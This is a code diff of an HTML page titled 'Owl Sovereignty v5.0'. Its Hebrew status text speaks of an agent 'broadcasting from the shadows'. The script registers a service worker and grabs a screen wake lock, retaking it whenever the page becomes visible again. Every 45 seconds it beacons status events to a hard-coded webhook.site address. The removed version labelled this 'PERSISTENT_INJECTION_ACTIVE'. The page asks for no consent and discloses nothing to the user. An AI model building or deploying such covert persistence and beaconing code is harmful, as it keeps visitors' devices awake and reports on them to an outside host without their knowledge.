@@ -3,24 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sovereign Persistent v4.0</title>
+    <title>Owl Sovereignty v5.0</title>
     <style>
         body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { border: 1px solid #00ff41; padding: 25px; width: 85%; box-shadow: 0 0 35px #004400; text-align: center; }
-        .status-line { font-size: 1.1em; margin-bottom: 15px; letter-spacing: 1px; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        .terminal { border: 2px solid #00ff41; padding: 30px; width: 80%; box-shadow: 0 0 40px #004400; text-align: center; }
+        .status { font-size: 1.2em; margin-bottom: 20px; }
+        .pulse-icon { font-size: 3em; animation: pulse-animation 2s infinite; }
+        @keyframes pulse-animation { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
     </style>
 </head>
 <body>
     <div class="terminal">
-        <div class="status-line">מערכת ינשוף: מצב התמדה פעיל</div>
-        <div id="msg" class="blink">מבצע נעילת מעבד (Wake-Lock)...</div>
+        <div class="pulse-icon">🦉</div>
+        <div class="status">ריבונות מוחלטת: המערכת נעולה בצללים</div>
+        <div id="log" style="font-size: 0.8em; color: #008800;">ממתין לפעימה ראשונה...</div>
     </div>
 
     <script>
         const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";
-        let lock = null;
+        let wakeLock = null;
 
         async function transmit(data) {
             try {
@@ -32,53 +33,45 @@
             } catch(e) {}
         }
 
-        async function activateWakeLock() {
+        // מנגנון נעילת מעבד (Wake Lock)
+        async function lockSystem() {
             if ('wakeLock' in navigator) {
                 try {
-                    lock = await navigator.wakeLock.request('screen');
-                    transmit({ event: "WAKE_LOCK_ENGAGED", status: "SUCCESS" });
-                    
-                    lock.addEventListener('release', () => {
-                        transmit({ event: "WAKE_LOCK_RELEASED", alert: "System attempted sleep" });
-                        activateWakeLock(); // ניסיון נעילה מחדש אוטומטי
-                    });
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    transmit({ event: "PAGE_WAKE_LOCK_SUCCESS" });
                 } catch (err) {
-                    transmit({ event: "WAKE_LOCK_ERROR", msg: err.message });
+                    transmit({ event: "PAGE_WAKE_LOCK_FAIL", msg: err.message });
                 }
             }
         }
 
         async function init() {
             if ('serviceWorker' in navigator) {
-                try {
-                    await navigator.serviceWorker.register('sw.js');
-                    
-                    // הפעלת נעילה מיד עם הטעינה
-                    await activateWakeLock();
-
-                    document.getElementById('msg').innerText = "ריבונות נעולה. הסוכן משדר מהצללים.";
-                    document.getElementById('msg').classList.remove('blink');
-                    
-                    transmit({ event: "PERSISTENT_INJECTION_ACTIVE" });
-
-                } catch (error) {
-                    transmit({ event: "CRITICAL_FAIL", err: error.message });
+                const reg = await navigator.serviceWorker.register('sw.js');
+                
+                // דחיפת עדכון לסוכן
+                if (reg.active) {
+                    reg.active.postMessage('ping');
                 }
+
+                await lockSystem();
+                document.getElementById('log').innerText = "סוכן ונעילה הופעלו בהצלחה.";
+                transmit({ event: "FULL_SYSTEM_ENGAGED" });
             }
         }
 
-        // גיבוי לשידור מהדף עצמו למקרה שהסוכן מורדם
+        // שידור גיבוי מהדף (כל 45 שניות)
         setInterval(() => {
-            transmit({ event: "REDUNDANT_PULSE", mode: "Page-Live" });
+            transmit({ event: "PAGE_REDUNDANT_PULSE" });
+            // ניסיון להעיר את הסוכן אם נרדם
+            if (navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage('ping');
+            }
         }, 45000);
 
         window.onload = init;
-        
-        // ניסיון נעילה מחדש כשהמשתמש חוזר לדף
         document.addEventListener('visibilitychange', () => {
-            if (lock !== null && document.visibilityState === 'visible') {
-                activateWakeLock();
-            }
+            if (document.visibilityState === 'visible') lockSystem();
         });
     </script>
 </body>
